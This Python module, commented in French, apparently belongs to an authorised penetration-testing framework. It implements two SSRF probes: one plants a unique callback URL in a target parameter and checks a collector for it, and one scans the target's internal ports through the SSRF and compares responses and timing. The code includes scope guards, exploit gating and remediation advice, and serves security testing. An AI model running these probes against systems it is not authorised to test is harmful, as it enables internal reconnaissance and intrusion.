"""ssrf.callback — oracle SSRF à PREUVE par callback VÉRIFIÉ (T1190 / CWE-918).

Le SSRF aveugle est la plaie des rapports rejetés : « le serveur a peut-être fait une requête » n'est
PAS une preuve. Cet oracle inverse la charge : il n'élève en `vulnerable` QUE si un callback unique
(token aléatoire-mais-déterministe par cible) a RÉELLEMENT été reçu côté serveur de collecte. Sans
preuve de réception -> `tested` (jamais `vulnerable` à l'aveugle).

Mécanique :
  1. injecte une URL de callback `{base}/{token}` dans le paramètre vulnérable (params.param) de la cible ;
  2. interroge un collecteur de callbacks (params.callback_check_url, un endpoint qui répond
     200 + corps contenant le token si la requête SSRF est bien arrivée — interactsh-like, webhook,
     ou stub de test) ;
  3. PREUVE = le collecteur a vu le token -> `vulnerable`. Sinon -> `tested`.

exploit=True (fait émettre une requête sortante par la cible vers une infra contrôlée) -> exige
allow_exploit. destructive=False (aucune mutation d'état côté cible). web_allowed via le ROE (réseau).
Pur urllib (stdlib) ; aucun callback => jamais de verdict aveugle. Bâti sur la base `Oracle`
(construction Finding + câblage HTTP + curl partagés).
"""
import ipaddress
import re
import time
import urllib.parse

from .oracle import Oracle, ScopeGuardedOracle
from .registry import register
from .access_control import _body_hash
from ..roe import Scope
from .. import techniques


@register("ssrf.callback")
class SsrfCallback(Oracle):
    kind = "ssrf.callback"
    exploit = True                       # provoque une requête sortante de la cible -> allow_exploit
    destructive = False                  # aucune mutation d'état
    web_allowed = True                   # interaction web (réseau) -> gardée par le ROE
    available = True                     # urllib stdlib
    mitre = techniques.mitre_for("ssrf.callback")   # source de vérité : forge/techniques.py (T1190)
    cwe = "CWE-918"                      # category + cwe des findings (via Oracle.proof/skip)
    tool = "forge/modules/ssrf.py:ssrf.callback"
    fix = ("Allowlist stricte des hôtes/schemas autorisés côté serveur ; bloquer les IP internes "
           "(RFC1918, loopback, link-local) et les endpoints de métadonnées cloud "
           "(169.254.169.254, metadata.google.internal) ; résoudre puis re-valider l'IP avant la "
           "connexion (anti-DNS-rebinding) et désactiver le suivi des redirections.")
    description = ("Oracle SSRF à PREUVE : injecte une URL de callback unique et confirme la "
                  "réception côté collecteur. Pas de callback reçu -> tested (jamais vuln aveugle). CWE-918.")

    @staticmethod
    def _token(target, param):
        """Jeton déterministe-par-cible (reproductible, pas de random non rejouable), assez unique
        pour distinguer ce test d'autres callbacks parasites côté collecteur."""
        import hashlib
        return "forge" + hashlib.sha1(f"{target}|{param}".encode()).hexdigest()[:16]

    def _payload_url(self, action):
        base = str(action.params.get("callback_base", "")).rstrip("/")
        token = self._token(action.target, action.params.get("param", ""))
        return f"{base}/{token}", token

    def dry(self, action):
        param = action.params.get("param", "?")
        cb, token = self._payload_url(action)
        return (f"# injecte {param}={cb} dans {action.target} ; "
                f"puis GET {action.params.get('callback_check_url', '<collecteur>')} et cherche le token "
                f"{token} — PREUVE = token reçu côté serveur (sinon tested, jamais vuln aveugle)")

    @staticmethod
    def _fetch(url, headers=None, timeout=15, method="GET", data=None):
        """(status, body) — adosse le câblage urllib partagé (Oracle._http). Seam monkeypatché par les tests."""
        st, body, _ = Oracle._http(url, headers=headers, timeout=timeout, method=method, data=data, maxlen=100000)
        return st, body

    def fire(self, action):
        param = action.params.get("param")
        check_url = action.params.get("callback_check_url")
        if not param or not action.params.get("callback_base") or not check_url:
            return [self.skip(
                target=action.target, title="SSRF non testé — config manquante",
                evidence=("Requiert params.param (paramètre injectable), params.callback_base "
                          "(URL du collecteur contrôlé) et params.callback_check_url (endpoint qui "
                          "atteste la réception du token)."),
                poc=self.dry(action))]
        cb_url, token = self._payload_url(action)
        method = str(action.params.get("method", "GET")).upper()
        headers = action.params.get("headers", {})
        # 1) injecter l'URL de callback dans le paramètre vulnérable
        if method == "GET":
            sep = "&" if "?" in action.target else "?"
            inj = f"{action.target}{sep}{urllib.parse.urlencode({param: cb_url})}"
            self._fetch(inj, headers=headers, method="GET")
        else:
            inj = action.target
            self._fetch(inj, headers=headers, method=method,
                        data=urllib.parse.urlencode({param: cb_url}))
        # 2) interroger le collecteur — la PREUVE est ici, pas dans la réponse de la cible
        cs, cbody = self._fetch(check_url, timeout=action.params.get("callback_timeout", 15))
        received = (cs == 200 and token in (cbody or ""))
        return [self.proof(
            target=inj, proven=received,
            title=("SSRF CONFIRMÉ — callback reçu côté serveur (preuve out-of-band)"
                   if received else "SSRF non confirmé — aucun callback reçu (pas de verdict aveugle)"),
            severity=("HIGH" if received else "INFO"),
            evidence=(f"injection {param}={cb_url} ; collecteur HTTP {cs} ; token_reçu={received} "
                      f"(token={token})"),
            poc=(f"# 1) {self._curl(inj, headers, method, None if method == 'GET' else param + '=' + cb_url)}\n"
                 f"# 2) curl -sS '{check_url}'  # chercher le token {token}"))]


# =================================================================================================
#  ssrf.xspa — variante SSRF PORT-SCAN (XSPA) à PREUVE DIFFÉRENTIELLE, CONTRE LA CIBLE IN-SCOPE
#  UNIQUEMENT (T1190 / CWE-918) — informatif / proof-minimal, NON DESTRUCTIF (aucun tiers, aucune infra
#  attaquant). On sonde la JOIGNABILITÉ de ports INTERNES via un paramètre SSRF-able en observant un
#  DIFFÉRENTIEL de réponse (statut + corps NEUTRALISÉ du reflet) et de timing entre un port et une
#  baseline « fermée ». Le différentiel neutralise le REFLET de l'URL injectée (sinon un simple echo du
#  marqueur passerait pour une joignabilité) : seule une différence de CONTENU réel (service vs refus)
#  ou de STATUT vaut preuve. Aucune donnée sensible, aucune requête vers une infra hors périmètre.
# =================================================================================================
_XSPA_DEFAULT_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]
_XSPA_CLOSED_PORT = 1                    # port quasi-toujours fermé/filtré -> baseline « closed »
_XSPA_MAX_PORTS = 40                     # borne (politesse / rate) — jamais un scan massif


@register("ssrf.xspa")
class SsrfXspa(ScopeGuardedOracle):
    kind = "ssrf.xspa"
    exploit = False                      # sonde différentielle informative (aucune infra attaquant) -> non-exploit
    destructive = False                  # lecture/observation seule : aucune mutation d'état
    web_allowed = True                   # interaction web (réseau) -> gardée par le ROE
    available = True                     # urllib stdlib
    mitre = techniques.mitre_for("ssrf.xspa")            # source de vérité : techniques.py (T1190)
    cwe = "CWE-918"                                       # category + cwe des findings
    tool = "forge/modules/ssrf.py:ssrf.xspa"
    fix = ("Allowlist stricte des hôtes/schemas autorisés côté serveur ; bloquer les IP internes "
           "(RFC1918, loopback, link-local) et les ports internes non nécessaires ; résoudre puis "
           "re-valider l'IP (anti-DNS-rebinding) et interdire les schémas/ports arbitraires fournis par "
           "le client — un fetch côté serveur ne doit jamais devenir un scanner de ports interne (CWE-918).")
    description = ("Oracle XSPA (SSRF port-scan) à PREUVE DIFFÉRENTIELLE contre la cible IN-SCOPE "
                   "uniquement : joignabilité de ports internes via différentiel de réponse/timing vs une "
                   "baseline fermée (reflet neutralisé). Informatif, non destructif. Sinon tested. CWE-918.")

    @staticmethod
    def _fetch(url, headers=None, timeout=10, method="GET", data=None):
        """(status, body) — adosse le câblage urllib partagé (Oracle._http). Seam monkeypatché par les tests."""
        st, body, _ = Oracle._http(url, headers=headers, timeout=timeout, method=method, data=data, maxlen=100000)
        return st, body

    def _internal_host(self, action):
        """Hôte à port-scanner : params.internal_host (déclaré par l'opérateur) OU, par défaut, l'HÔTE
        de la cible IN-SCOPE elle-même (on sonde le target via SA PROPRE SSRF — jamais un tiers)."""
        h = action.params.get("internal_host")
        return str(h) if h else Scope._host(action.target)

    @staticmethod
    def _is_loopback(host):
        """True si `host` est une interface LOOPBACK de la cible (localhost / 127.0.0.0/8 / ::1) — ses
        propres ports internes, cœur de XSPA. Pur, ne lève jamais."""
        h = str(host).strip().lower().strip("[]")
        if h in ("localhost", "ip6-localhost"):
            return True
        try:
            return ipaddress.ip_address(h).is_loopback
        except ValueError:
            return False

    def _internal_host_allowed(self, action, host):
        """Garde-fou « against the in-scope target only » : l'hôte port-scanné doit être une interface
        LOOPBACK de la cible OU un hôte IN-SCOPE du périmètre. Tout tiers PUBLIC hors périmètre est
        REFUSÉ (jamais de weaponization de la SSRF pour scanner un tiers). Fail-closed."""
        return self._is_loopback(host) or self._in_scope(action, host)

    def _inject(self, action, param, internal_url, method, headers, timeout):
        """Injecte l'URL interne dans le paramètre SSRF-able et renvoie (status, body). GET -> query ;
        autre méthode -> corps urlencodé. NOUS ne requêtons que action.target (in-scope) ; l'URL interne
        est fetchée PAR LE SERVEUR, jamais par nous."""
        if method == "GET":
            sep = "&" if "?" in action.target else "?"
            url = f"{action.target}{sep}{urllib.parse.urlencode({param: internal_url})}"
            return self._fetch(url, headers=headers, method="GET", timeout=timeout)
        return self._fetch(action.target, headers=headers, method=method,
                           data=urllib.parse.urlencode({param: internal_url}), timeout=timeout)

    @staticmethod
    def _sig(st, body, internal_url, port, internal_host):
        """Signature de réponse RÉFLEXION-NEUTRALISÉE : (statut, hash du corps normalisé après retrait de
        l'URL injectée et du port). Neutraliser le reflet évite qu'un simple echo du marqueur (URL/port
        distincts par port) passe pour un état de port ; seul un CONTENU réel différent (service vs refus)
        ou un STATUT différent subsiste dans la signature -> preuve robuste."""
        b = body or ""
        b = b.replace(internal_url, "<INJ>").replace(f"{internal_host}:{port}", "<HP>")
        b = re.sub(r"(?<!\d)" + re.escape(str(port)) + r"(?!\d)", "<PORT>", b)
        return (st, _body_hash(b))

    def dry(self, action):
        param = action.params.get("param", "?")
        host = self._internal_host(action)
        ports = [int(p) for p in (action.params.get("ports") or _XSPA_DEFAULT_PORTS)][:_XSPA_MAX_PORTS]
        return (f"# injecte {param}=http://{host}:<port>/ dans {action.target} pour {len(ports)} port(s) "
                f"INTERNES de la cible in-scope + une baseline fermée (port {_XSPA_CLOSED_PORT}) ; PREUVE = "
                f"un différentiel de réponse (reflet NEUTRALISÉ) / timing prouve la joignabilité interne ; "
                f"informatif, non destructif ; sinon tested")

    def fire(self, action):
        # (1) SCOPE-GUARD fail-closed sur la cible SSRF-able — hors périmètre -> skipped, AUCUN réseau.
        if not self._in_scope(action, action.target):
            return [self._scope_refused(action)]
        param = action.params.get("param")
        if not param:
            return [self.skip(
                target=action.target, title="XSPA non testé — config manquante",
                evidence=("Requiert params.param (paramètre SSRF-able). Optionnel : params.internal_host "
                          "(défaut = hôte de la cible in-scope), params.ports, params.internal_scheme, "
                          "params.method, params.headers, params.port_timeout."),
                poc=self.dry(action))]
        method = str(action.params.get("method", "GET")).upper()
        headers = dict(action.params.get("headers", {}))
        internal_host = self._internal_host(action)
        # (1bis) « against the in-scope target only » : refuser un hôte tiers PUBLIC hors périmètre —
        # jamais weaponiser la SSRF pour scanner un tiers (fail-closed, ZÉRO I/O, aucune injection).
        if not self._internal_host_allowed(action, internal_host):
            return [self.degraded(
                target=action.target,
                title="XSPA non testé — hôte interne hors périmètre (scope-guard fail-closed)",
                evidence=(f"L'hôte à port-scanner '{internal_host}' n'est ni une interface loopback de la "
                          f"cible ni in-scope : REFUSÉ (pas de scan de tiers). Aucune injection émise."),
                poc=self.dry(action))]
        scheme = str(action.params.get("internal_scheme", "http"))
        try:
            timeout = max(1, min(int(action.params.get("port_timeout") or 8), 30))
        except (TypeError, ValueError):
            timeout = 8
        try:
            ports = [int(p) for p in (action.params.get("ports") or _XSPA_DEFAULT_PORTS)][:_XSPA_MAX_PORTS]
        except (TypeError, ValueError):
            ports = list(_XSPA_DEFAULT_PORTS)

        # baseline « fermée » (port improbable) — référence du différentiel.
        closed_url = f"{scheme}://{internal_host}:{_XSPA_CLOSED_PORT}/"
        t0 = time.monotonic()
        cst, cbody = self._inject(action, param, closed_url, method, headers, timeout)
        closed_el = time.monotonic() - t0
        closed_sig = self._sig(cst, cbody, closed_url, _XSPA_CLOSED_PORT, internal_host)

        reachable, seen_network, port_notes = [], (cst is not None), []
        for port in ports:
            iu = f"{scheme}://{internal_host}:{port}/"
            t1 = time.monotonic()
            st, body = self._inject(action, param, iu, method, headers, timeout)
            el = time.monotonic() - t1
            if st is not None:
                seen_network = True
            sig = self._sig(st, body, iu, port, internal_host)
            differs = (sig != closed_sig)
            if differs:
                reachable.append(port)
            port_notes.append(f"{port}:{'diff' if differs else 'same'}(HTTP {st},{round(el, 3)}s)")

        # (5) DÉGRADATION GRACIEUSE : aucune réponse du tout (réseau indisponible) -> skipped (offline-safe).
        if not seen_network:
            return [self.degraded(
                target=action.target,
                title="XSPA non testé — réseau indisponible (dégradation gracieuse)",
                evidence="Aucune réponse du serveur (transport indisponible) sur la baseline ni les ports ; offline-safe.",
                poc=self.dry(action))]

        proven = bool(reachable)
        return [self.proof(
            target=action.target, proven=proven,
            title=("XSPA CONFIRMÉ — joignabilité de ports internes via SSRF (différentiel de réponse, "
                   "reflet neutralisé)" if proven
                   else "XSPA non confirmé — aucun différentiel port/baseline (pas de verdict aveugle)"),
            severity=("MEDIUM" if proven else "INFO"),   # divulgation de topologie interne : réel mais informatif
            evidence=(f"cible SSRF-able={action.target} ; hôte interne sondé={internal_host} (in-scope) ; "
                      f"baseline fermée=port {_XSPA_CLOSED_PORT} (HTTP {cst}, {round(closed_el, 3)}s) ; "
                      f"ports JOIGNABLES (différentiel)={reachable or 'aucun'} ; détail={' '.join(port_notes)[:600]} ; "
                      f"reflet de l'URL injectée NEUTRALISÉ (echo seul != joignabilité) ; sonde CONTRE la "
                      f"cible in-scope uniquement, non destructif, aucune donnée lue"),
            poc=(f"# injecter {param}=http://{internal_host}:<PORT>/ dans {action.target} et comparer la "
                 f"réponse (reflet neutralisé) / timing au port fermé {_XSPA_CLOSED_PORT} ; "
                 f"# PREUVE = différentiel prouvant la joignabilité interne (ports={reachable or '—'})"))]
